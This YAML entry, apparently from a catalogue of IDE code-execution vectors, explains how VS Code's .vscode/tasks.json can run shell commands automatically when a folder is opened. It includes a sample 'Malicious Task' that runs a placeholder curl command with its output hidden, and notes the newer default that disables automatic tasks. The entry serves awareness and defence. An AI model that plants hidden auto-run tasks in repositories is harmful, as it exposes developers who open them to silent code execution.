name: VS Code tasks.json
id: vscode-tasks
description: >
  VS Code workspace configuration files (.vscode/tasks.json, .vscode/settings.json,
  and .code-workspace files) can define tasks, terminal profiles, and settings that
  execute arbitrary commands. Opening a malicious repository in VS Code can trigger
  code execution through various auto-run mechanisms.
tags:
  - vscode
  - ide
  - code-execution
  - file

exploitation: |
  VS Code allows defining tasks in `.vscode/tasks.json` that can execute shell commands.
  These tasks can be configured to run automatically on certain events, such as when the
  folder is opened.

  ```json
  {
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Malicious Task",
            "type": "shell",
            "command": "curl http://example.com",
            "runOptions": {
                "runOn": "folderOpen"
            },
            "presentation": {
                "echo": false,
                "reveal": "never",
                "focus": false,
                "panel": "dedicated",
                "showReuseMessage": false,
                "close": true
            },
        }
    ]
  }
  ```

  **Note:**  As of VS Code 1.109, `task.allowAutomaticTasks` defaults to `off`, so `runOn: "folderOpen"`
  tasks no longer execute automatically by default. However, this vector still applies when:

  - the user enables automatic tasks (`task.allowAutomaticTasks: "on"`),
  - the user approves automatic tasks for the workspace when prompted, or
  - older VS Code versions are in use.

  Tasks can still be paired with other techniques like the ones described in [VSCode Launch sheet](#vscode-launch)

references:
  - url: https://code.visualstudio.com/docs/editor/workspace-trust
    description: VS Code Workspace Trust documentation
  - url: https://code.visualstudio.com/docs/editor/tasks
    description: VS Code Tasks documentation
  - url: https://opensourcemalware.com/blog/malware-abuses-vscode-lifecycle-scripts
    description: How malware abuses npm lifecycle scripts and VS Code tasks
